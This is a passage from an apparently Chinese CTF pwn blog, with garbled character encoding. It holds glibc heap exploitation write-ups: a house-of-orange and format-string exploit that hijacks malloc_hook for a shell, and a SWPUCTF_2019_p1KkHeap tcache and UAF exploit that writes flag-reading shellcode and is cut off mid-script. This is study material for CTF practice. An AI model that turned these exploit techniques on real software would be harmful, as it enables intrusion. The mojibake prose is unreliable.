<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;addr: &quot;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br></pre></td></tr></table></figure>
<h4 id="Step2-house-of-orangeå¾—åˆ°unsorted-bin"><a class="header-anchor" href="#Step2-house-of-orangeå¾—åˆ°unsorted-bin">Â¶</a>Step2 house of orangeå¾—åˆ°unsorted bin</h4>
<p>å‰é¢æˆ‘ä»¬é€šè¿‡å †æº¢å‡ºæ¥ä¿®æ”¹top chunk çš„size ï¼Œä½†æ˜¯è¿™é“é¢˜ä¸è¡Œ<br>
è¿™é“é¢˜éœ€è¦ç”¨ï¼Œscanfçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ¥ä¿®æ”¹æ•°æ®<br>
ä¸€èˆ¬æ¥è¯´scanf(â€œ%dâ€,&amp;a),%dæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œ&amp;aæ˜¯å‚æ•°ï¼Œscanfçš„å‰5ä¸ªå‚æ•°éƒ½æ˜¯ç”±å¯„å­˜å™¨å‚¨å­˜çš„ï¼Œä»ç¬¬6ä¸ªå¼€å§‹å‚¨å­˜åœ¨æ ˆä¸Š<br>
æ‰€ä»¥æˆ‘ä»¬æ„é€ æ ¼å¼åŒ–å­—ç¬¦ä¸² %7$s.ljust(8,â€˜\x00â€™) (åŸå› æ˜¯æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå‚æ•°ä¼šæ”¾ç½®æˆ‘ä»¬çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ªå‚æ•°åˆ™ä¼šå»ä½œä¸ºæˆ‘ä»¬ä»»æ„åœ°å€å†™çš„å‚æ•°)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">top_chunk = heap_addr + <span class="number">0x40</span></span><br><span class="line">top_size = top_chunk + <span class="number">8</span></span><br><span class="line">say(<span class="string">b&#x27;%7$daaaa&#x27;</span>+p64(top_size),<span class="built_in">str</span>(<span class="number">0xfb1</span>))</span><br></pre></td></tr></table></figure>
<p><img src="http://static.zybuluo.com/hgggg/70yvps4st5g58xgbznkad2rl/23.png" alt="23.png-19.5kB"><br>
å¯ä»¥çœ‹åˆ°top chunk å·²ç»è¢«æˆäº†ä¼ªé€ 0xfb1<br>
æ¥ä¸‹æ¥åªè¦æˆ‘ä»¬è¿ç»­ç”³è¯·chunkå°±èƒ½å¾—åˆ°unsorted bin æ¥leak libcäº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = libc_addr - <span class="number">0x3C4C61</span></span><br></pre></td></tr></table></figure>
<p><img src="http://static.zybuluo.com/hgggg/2lsotbhov1sfzdv9d462p2es/24.png" alt="24.png-66kB"></p>
<h4 id="Step3-malloc-hook-åŠ«æŒä¸º-realloc-ï¼Œrealloc-hook-åŠ«æŒä¸º-onegadget-æ¥-get-shell"><a class="header-anchor" href="#Step3-malloc-hook-åŠ«æŒä¸º-realloc-ï¼Œrealloc-hook-åŠ«æŒä¸º-onegadget-æ¥-get-shell">Â¶</a>Step3  malloc_hook åŠ«æŒä¸º realloc ï¼Œrealloc_hook åŠ«æŒä¸º onegadget æ¥ get shell</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">one_gadgets = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">one = libc_base + one_gadgets[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">say(<span class="string">b&#x27;%7$saaaa&#x27;</span>+p64(malloc_hook-<span class="number">8</span>),p64(one)+p64(realloc+<span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="åæ€"><a class="header-anchor" href="#åæ€">Â¶</a>åæ€</h2>
<p>ä¸Šè¿°çš„åˆ©ç”¨æ–¹å¼ä»…ä»…åªæ˜¯å¯¹glibc2.23åŠä»¥ä¸‹ç‰ˆæœ¬æœ‰æ•ˆ<br>
åœ¨glibc2.24 - 2.26 ä¹‹é—´å¢åŠ äº†å¯¹vtableåˆæ³•æ€§çš„æ£€æŸ¥ï¼Œå³è™šè¡¨çš„åœ°å€å¿…é¡»åœ¨__start__libc_IO_vatbales å’Œ __stop__libc_IO_vtablesä¹‹é—´<br>
bypassæ€è·¯ï¼š__overflow-&gt;_IO_strn_jump-&gt;_IO_str_finish(_IO_FILE+0x38 = /bin/sh , _IO_FIE+0Xe8 = system)</p>
<pre><code>1.fp-&gt;mode = 0
2._IO_write_ptr &lt; _IO_write_base
3._IO_read_ptr = 0x60 (small bin [4])
4._IO_read_base = _IO_list_all - 0x10 (unsorted bin bk)
5.vtable = _IO_str_jump - 8 
6.byte(fp-&gt;flags) = 0
7.fp -&gt; _IO_buf_base = /bin/sh
8.fp -&gt; 0xe8 = system
</code></pre>
<p>åœ¨glibc2.27ä¹‹ååˆ™æ˜¯å»æ‰äº†abort()ä¸­çš„fflush(NULL)ä½¿å¾—è¯¥æ¼æ´æ— æ³•å¾—åˆ°åˆ©ç”¨</p>
<p>P.S. åœ¨ä¼ªé€ top chunkæ—¶è¦æ³¨æ„åˆæ³•æ€§</p>
<h2 id="å‚è€ƒé“¾æ¥"><a class="header-anchor" href="#å‚è€ƒé“¾æ¥">Â¶</a>å‚è€ƒé“¾æ¥</h2>
<p><a href="https://www.bilibili.com/video/BV1Uv411j7fr?p=28">https://www.bilibili.com/video/BV1Uv411j7fr?p=28</a><br>
<a href="https://mp.weixin.qq.com/s?__biz=MzkxMTI2NTQ0NA==&amp;mid=2247483912&amp;idx=5&amp;sn=08530a5ac5dd9b87ca43d9abff3939de&amp;chksm=c11f99c3f66810d53cdec65944e86e59af183102337f0f35b284ccb19456bee99df8cbe02255&amp;mpshare=1&amp;scene=23&amp;srcid=08265eMSjEXjdjMfogEOv6UO&amp;sharer_sharetime=1629949810901&amp;sharer_shareid=e6354a0018f4b85eab5b69e4a2130a22#rd">https://mp.weixin.qq.com/s?__biz=MzkxMTI2NTQ0NA==&amp;mid=2247483912&amp;idx=5&amp;sn=08530a5ac5dd9b87ca43d9abff3939de&amp;chksm=c11f99c3f66810d53cdec65944e86e59af183102337f0f35b284ccb19456bee99df8cbe02255&amp;mpshare=1&amp;scene=23&amp;srcid=08265eMSjEXjdjMfogEOv6UO&amp;sharer_sharetime=1629949810901&amp;sharer_shareid=e6354a0018f4b85eab5b69e4a2130a22#rd</a><br>
<a href="https://www.cnblogs.com/hetianlab/p/13884739.html">https://www.cnblogs.com/hetianlab/p/13884739.html</a><br>
<a href="https://blog.csdn.net/seaaseesa/article/details/104314949">https://blog.csdn.net/seaaseesa/article/details/104314949</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnç¬”è®°</tag>
        <tag>glibcå †</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTF pwn åˆ·é¢˜è®°å½•(æŒç»­æ›´æ–°)</title>
    <url>/2021/10/04/NSSCTF%20pwn%20%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>è¿™æ˜¯ä¸€ä¸ªè®°å½•åœ¨NSSCTFå¹³å°ä¸Šåˆ·pwné¢˜çš„åšå®¢ï¼Œé¢˜ç›®é¡ºåºæŒ‰ç…§åˆ·é¢˜çš„å…ˆåé¡ºåº</p>
<span id="more"></span>
<h2 id="SWPUCTF-2019-p1KkHeap"><a class="header-anchor" href="#SWPUCTF-2019-p1KkHeap">Â¶</a>SWPUCTF_2019_p1KkHeap</h2>
<h3 id="é¢˜ç›®è€ƒç‚¹"><a class="header-anchor" href="#é¢˜ç›®è€ƒç‚¹">Â¶</a>é¢˜ç›®è€ƒç‚¹</h3>
<pre><code>1.tacahe bin attact
2.unsorted bin attact
3.malloc hook
</code></pre>
<h3 id="å‡½æ•°"><a class="header-anchor" href="#å‡½æ•°">Â¶</a>å‡½æ•°</h3>
<p>main å…¶ä¸­çš„å„ç§åŠŸèƒ½åªèƒ½è°ƒç”¨18æ¬¡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  const char *v3; // rdi</span><br><span class="line">  int v4; // eax</span><br><span class="line"></span><br><span class="line">  sub_B0A();</span><br><span class="line">  v3 = &quot;                           Welcome to SWPUCTF 2019&quot;;</span><br><span class="line">  puts(&quot;                           Welcome to SWPUCTF 2019&quot;);</span><br><span class="line">  while ( dword_202024 &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_10C5();</span><br><span class="line">    v4 = sub_1076(v3, a2);</span><br><span class="line">    if ( v4 == 3 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_EC1();</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v4 &gt; 3 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v4 == 5 )</span><br><span class="line">        ((void (*)(void))sub_E04)();</span><br><span class="line">      if ( v4 &lt; 5 )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_FD1();</span><br><span class="line">      &#125;</span><br><span class="line">      else if ( v4 == 666 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = &quot;p1Kk wants a boyfriend!&quot;;</span><br><span class="line">        puts(&quot;p1Kk wants a boyfriend!&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v4 == 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_E1E();</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v4 == 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_F58();</span><br><span class="line">    &#125;</span><br><span class="line">    --dword_202024;                             // 18</span><br><span class="line">  &#125;</span><br><span class="line">  sub_E04(v3, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sub_BA0  å®Œæˆåˆå§‹åŒ–ä»¥åŠæ²™ç›’,é€šè¿‡seccomp-toolså¾—çŸ¥ç¦ç”¨äº†one_gadgetç³»ç»Ÿè°ƒç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setbuf(stdin, 0LL);</span><br><span class="line">setbuf(stdout, 0LL);</span><br><span class="line">setbuf(stderr, 0LL);</span><br><span class="line">fd = open(&quot;./logo&quot;, 4);</span><br><span class="line">read(fd, &amp;unk_202140, 0x10932uLL);</span><br><span class="line">write(1, &amp;unk_202140, 0x10932uLL);</span><br><span class="line">write(1, asc_202040, 0x52uLL);</span><br><span class="line">close(fd);</span><br><span class="line">if ( mmap((void *)0x66660000, 0x1000uLL, 7, 34, -1, 0LL) != (void *)1717960704 )// åœ¨0x66660000å¤„æ˜ å°„äº†0x1000å¤§å°çš„å†…å­˜</span><br><span class="line">  exit(-1);</span><br><span class="line">memset((void *)0x66660000, 0, 0x1000uLL);</span><br><span class="line">strcpy((char *)0x66660000, &quot;SWPUCTF_p1Kk&quot;);</span><br><span class="line">prctl(38, 1LL, 0LL, 0LL, 0LL);                // æ²™ç®±ç¦ç”¨</span><br></pre></td></tr></table></figure>
<p>add</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_E1E(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  size_t size; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;size: &quot;);</span><br><span class="line">  size = sub_1076();</span><br><span class="line">  if ( size &gt; 0x100 )                           // æœ€å¤§ç”³è¯·0x100</span><br><span class="line">    sub_E04(&quot;size: &quot;, a2);</span><br><span class="line">  v3 = sub_DA9();</span><br><span class="line">  if ( v3 &lt;= 7 )                                // æœ€å¤šç”³è¯·7ä¸ª</span><br><span class="line">  &#123;</span><br><span class="line">    qword_202100[v3] = malloc(size);</span><br><span class="line">    dword_2020E0[v3] = size;</span><br><span class="line">  &#125;</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>delete</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_FD1(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v3; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  if ( dword_202020 &lt;= 0 )</span><br><span class="line">    sub_E04(a1, a2);</span><br><span class="line">  printf(&quot;id: &quot;);</span><br><span class="line">  v3 = sub_1076();</span><br><span class="line">  if ( v3 &gt; 7 )</span><br><span class="line">    sub_E04(&quot;id: &quot;, a2);</span><br><span class="line">  free((void *)qword_202100[v3]);</span><br><span class="line">  dword_2020E0[v3] = 0;                         // è¿™é‡ŒåªæŠŠå¤§å°æ¸…é›¶ï¼Œå´æ²¡æŠŠæŒ‡é’ˆæ¸…é›¶ å­˜åœ¨UAF</span><br><span class="line">  --dword_202020;                               // dword_202020=3ï¼Œåªèƒ½freeä¸‰æ¬¡</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>show</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_F58(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v3; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;id: &quot;);</span><br><span class="line">  v3 = sub_1076();</span><br><span class="line">  if ( v3 &gt; 7 )</span><br><span class="line">    sub_E04(&quot;id: &quot;, a2);</span><br><span class="line">  printf(&quot;content: &quot;);</span><br><span class="line">  puts((const char *)qword_202100[v3]);</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>edit</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_EC1(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v3; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;id: &quot;);</span><br><span class="line">  v3 = sub_1076();</span><br><span class="line">  if ( v3 &gt; 7 )</span><br><span class="line">    sub_E04(&quot;id: &quot;, a2);</span><br><span class="line">  printf(&quot;content: &quot;);</span><br><span class="line">  read(0, *((void **)&amp;qword_202100 + v3), dword_2020E0[v3]);</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="æ”»å‡»æ€è·¯"><a class="header-anchor" href="#æ”»å‡»æ€è·¯">Â¶</a>æ”»å‡»æ€è·¯</h3>
<p>è¿™é‡Œæ˜¯è½¬è‡ªæ˜Ÿç›Ÿçš„ha1vkå¸ˆå‚…çš„æ”»å‡»æ€è·¯</p>
<p>æˆ‘ä»¬è¯¥å¦‚ä½•è§¦å‘shellcodeæˆ–ROPï¼Œåœ¨è¿™ï¼Œæˆ‘ä»¬å¯ä»¥æ”»å‡»__malloc_hookï¼Œå°†shellcodeçš„åœ°å€å†™å…¥åˆ°__malloc_hookï¼Œåœ¨è¿™é‡Œï¼ŒROPæ˜¾ç„¶å¾ˆéº»çƒ¦ï¼Œå› ä¸ºROPè¿˜è¦åšæ ˆè½¬ç§»ï¼Œå¹¶ä¸”éœ€è¦å…ˆå‰ä¾é ä¸€æ®µshellcodeæ¥è½¬ç§»æ ˆï¼Œå¦‚æœä¾›æˆ‘ä»¬å­˜æ”¾shellcodeçš„åœ°æ–¹ç©ºé—´å¾ˆå°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è€ƒè™‘å†™ä¸€æ®µç®€çŸ­çš„shellcodeï¼Œå°†æ ˆè½¬ç§»ï¼Œä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬æœ‰è¶³å¤Ÿçš„ç©ºé—´æ¥æ”¾shellcodeï¼Œé‚£ä¹ˆï¼Œç›´æ¥æŠŠè¯»å–å’Œè¾“å‡ºflagçš„shellcodeå†™åˆ°é‚£ä¸ªç©ºé—´ã€‚</p>
<p>å¯¹äºå¯å†™shellcodeçš„ç©ºé—´å¾ˆå°ï¼Œæˆ‘è¿˜æƒ³åˆ°äº†å¦å¤–ä¸€ç§æ–¹æ³•ï¼Œé‚£å°±æ˜¯å†™ä¸€æ®µç®€çŸ­çš„shellcodeï¼Œæ¥è°ƒç”¨int mprotect(const void *start, size_t len, int prot)å‡½æ•°ï¼Œå°†æŸåœ°å€å¤„å±æ€§ä¿®æ”¹ä¸ºå¯æ‰§è¡Œï¼Œæ¯”å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæŸä¸ªå †ä¿®æ”¹ä¸ºå¯æ‰§è¡Œï¼Œé‚£ä¹ˆå°±èƒ½åœ¨å †é‡Œå¸ƒä¸‹shellcodeã€‚</p>
<p>ç¨‹åºåœ¨0x66660000è¿™ä¸ªå›ºå®šçš„åœ°å€å¤„æ˜ å°„äº†0x1000å¤§å°çš„ç©ºé—´ï¼Œå¹¶ä¸”å±æ€§ä¸ºRWXï¼Œæ—¢å¯è¯»å†™ï¼Œä¹Ÿå…·æœ‰æ‰§è¡Œå±æ€§ï¼Œå¹¶ä¸”åœ°å€å›ºå®šä¸º0x66660000ï¼Œä½¿å¾—æˆ‘ä»¬æ›´åŠ æ–¹ä¾¿ã€‚</p>
<p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å†³å®šæŠŠshellcodeå†™åˆ°0x66660000å¤„ï¼Œç„¶åæ”»å‡»malloc_hook,åœ¨malloc_hookå¤„å†™å…¥0x66660000ï¼Œè¿™æ ·ï¼Œå½“æˆ‘ä»¬å†æ¬¡mallocæ—¶ï¼Œå°±ä¼šæ‰§è¡Œshellcodeã€‚</p>
<p>é¦–å…ˆï¼Œéœ€è¦æ³„éœ²ä¸€äº›åœ°å€ï¼Œé‚£ä¹ˆéœ€è¦ç”¨åˆ°unsorted binï¼Œä½†æ˜¯ï¼Œç”±äºtcacheçš„å­˜åœ¨ï¼Œå¯¹åº”çš„tcache binæ»¡7ä¸ªï¼Œæ¥ä¸‹æ¥çš„å †å—æ‰ä¼šæ”¾å…¥unsorted binã€‚æ»¡7ä¸ªï¼Œå°±å¿…é¡»delete 7æ¬¡ï¼Œæœ¬é¢˜æœ€å¤šåªèƒ½ç”¨3æ¬¡ï¼Œæ˜¾ç„¶è¿™ä¸ªæ–¹æ¡ˆä¸å¯è¡Œã€‚</p>
<p>ä¸‹é¢æ˜¯tcacheçš„æºç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct malloc_par  </span><br><span class="line">&#123;  </span><br><span class="line">  /* Tunable parameters */  </span><br><span class="line">  unsigned long trim_threshold;  </span><br><span class="line">  INTERNAL_SIZE_T top_pad;  </span><br><span class="line">  INTERNAL_SIZE_T mmap_threshold;  </span><br><span class="line">  INTERNAL_SIZE_T arena_test;  </span><br><span class="line">  INTERNAL_SIZE_T arena_max;  </span><br><span class="line">  </span><br><span class="line">  /* Memory map support */  </span><br><span class="line">  int n_mmaps;  </span><br><span class="line">  int n_mmaps_max;  </span><br><span class="line">  int max_n_mmaps;  </span><br><span class="line">  /* the mmap_threshold is dynamic, until the user sets </span><br><span class="line">     it manually, at which point we need to disable any </span><br><span class="line">     dynamic behavior. */  </span><br><span class="line">  int no_dyn_threshold;  </span><br><span class="line">  </span><br><span class="line">  /* Statistics */  </span><br><span class="line">  INTERNAL_SIZE_T mmapped_mem;  </span><br><span class="line">  INTERNAL_SIZE_T max_mmapped_mem;  </span><br><span class="line">  </span><br><span class="line">  /* First address handed out by MORECORE/sbrk.  */  </span><br><span class="line">  char *sbrk_base;  </span><br><span class="line">  </span><br><span class="line">#if USE_TCACHE  </span><br><span class="line">  /* Maximum number of buckets to use.  */  </span><br><span class="line">  size_t tcache_bins;  </span><br><span class="line">  size_t tcache_max_bytes;  </span><br><span class="line">  /* Maximum number of chunks in each bucket.  */  </span><br><span class="line">  size_t tcache_count;  </span><br><span class="line">  /* Maximum number of chunks to remove from the unsorted list, which </span><br><span class="line">     aren&#x27;t used to prefill the cache.  */  </span><br><span class="line">  size_t tcache_unsorted_limit;  </span><br><span class="line">#endif  </span><br><span class="line">&#125;;  </span><br><span class="line">  </span><br><span class="line">static struct malloc_par mp_ =  </span><br><span class="line">&#123;  </span><br><span class="line">  .top_pad = DEFAULT_TOP_PAD,  </span><br><span class="line">  .n_mmaps_max = DEFAULT_MMAP_MAX,  </span><br><span class="line">  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,  </span><br><span class="line">  .trim_threshold = DEFAULT_TRIM_THRESHOLD,  </span><br><span class="line">#define NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))  </span><br><span class="line">  .arena_test = NARENAS_FROM_NCORES (1)  </span><br><span class="line">#if USE_TCACHE  </span><br><span class="line">  ,  </span><br><span class="line">  .tcache_count = TCACHE_FILL_COUNT,  </span><br><span class="line">  .tcache_bins = TCACHE_MAX_BINS,  </span><br><span class="line">  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS-1),  </span><br><span class="line">  .tcache_unsorted_limit = 0 /* No limit.  */  </span><br><span class="line">#endif  </span><br><span class="line">&#125;;  </span><br></pre></td></tr></table></figure>
<p>æ³¨æ„ï¼Œsize_t tcache_bins;æ˜¯æ— ç¬¦å·çš„ï¼Œä½†æ˜¯ tcache-&gt;counts[tc_idx]æ˜¯æœ‰ç¬¦å·æ•°ç»„</p>
<p>å½“ä¸€ä¸ªæœ‰ç¬¦å·æ•°å’Œä¸€ä¸ªæ— ç¬¦å·æ•°è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œæœ‰ç¬¦å·æ•°ä¼šå…ˆè½¬æ¢æˆæ— ç¬¦å·æ•°ï¼Œç„¶åå†è¿›è¡Œæ¯”è¾ƒã€‚</p>
<p>é‚£ä¹ˆï¼Œå‡è®¾ï¼Œæˆ‘ä»¬double freeåŒä¸€ä¸ªå †ï¼Œé‚£ä¹ˆåœ¨tcache biné‡Œå°±ä¼šæ„æˆå¾ªç¯é“¾è¡¨ï¼Œæ­¤æ—¶count=2ï¼Œç„¶åï¼Œæˆ‘ä»¬å†create 3ä¸ªä¸€æ ·å¤§å°çš„å †ï¼Œé‚£ä¹ˆcountå°±å˜æˆäº†-1,æ­¤æ—¶ï¼Œæˆ‘ä»¬å†deleteä¸€ä¸ªunsorted binèŒƒå›´çš„å †ï¼Œè¿™ä¸ªå †å°±ä¼šæ”¾å…¥unsorted binï¼Œç„¶åæˆ‘ä»¬ç”¨showåŠŸèƒ½å°±èƒ½æ³„éœ²å‡ºlibcä¸­çš„æŒ‡é’ˆã€‚</p>
<p>ä½†æ˜¯è¯¥ç¨‹åºåªèƒ½free3æ¬¡ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨ä¸€æ¬¡æ”»å‡»ï¼Œç›´æ¥å»æ”»å‡»tcache binçš„è¡¨å¤´ï¼Œé‚£ä¹ˆï¼Œä¸‹æ¬¡ï¼Œæˆ‘ä»¬å°±èƒ½ç›´æ¥ä¿®æ”¹è¡¨å¤´ï¼Œæ¥å†³å®šä¸‹ä¸€æ¬¡å †åˆ†é…åˆ°å“ªä¸ªåœ°æ–¹ã€‚</p>
<h3 id="exp"><a class="header-anchor" href="#exp">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF (<span class="string">&#x27;/home/hgg/Desktop/pwn/heap/pwn1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/hgg/Desktop/pwn/heap/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="number">1.14</span><span class="number">.71</span><span class="number">.254</span>:<span class="number">28070</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,data</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#1</span></span><br><span class="line"><span class="comment">#tcache_dup</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#1_chunk get tcache_entry</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">first_chunk=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">tcache_entry=first_chunk-<span class="number">0x198</span>-<span class="number">0x110</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(tcache_entry))</span><br><span class="line"><span class="comment">#edit fd -&gt; tache_entry</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(tcache_entry))</span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#3 </span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#4 get tcache_entry</span></span><br><span class="line">rwx_add=<span class="number">0x66660000</span></span><br><span class="line">edit(<span class="number">4</span>,p64(rwx_add))<span class="comment">#edit tcache_entry</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#5 get rwx memory</span></span><br><span class="line"><span class="comment">#write shellcode</span></span><br><span class="line">shellcode=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">shellcode+=shellcraft.read(<span class="number">3</span>,<span class="number">0x66660100</span>,<span class="number">64</span>)</span><br><span class="line">shellcode+=shellcraft.write(<span class="number">1</span>,<span class="number">0x66660100</span>,<span class="number">64</span>)</span><br><span class="line">edit(<span class="number">5</span>,asm(shellcode))</span><br><span class="line"><span class="comment">#tcache_count is -1(0xff) now</span></span><br><span class="line"><span class="comment">#unsortbin attack</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span 